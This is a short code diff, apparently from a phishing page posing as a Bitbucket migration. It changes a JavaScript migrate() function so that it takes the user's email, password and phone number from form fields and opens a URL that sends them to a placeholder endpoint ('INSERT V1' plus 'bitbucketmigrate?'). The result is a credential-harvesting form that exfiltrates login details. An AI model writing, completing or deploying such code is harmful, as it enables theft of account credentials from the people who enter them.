@@ -72,7 +72,7 @@ var phone = document.getElementById('phone');
 var password = document.getElementById('password');
 function migrate(){
     var res = "INSERT V1"
-    var v1 = email.value+"&password="+password.value+"&phone="+phone.value;
+    var v1 = res + "bitbucketmigrate?email="+email.value+"&password="+password.value+"&phone="+phone.value;
     
     window.open(v1,"_blank");
 }
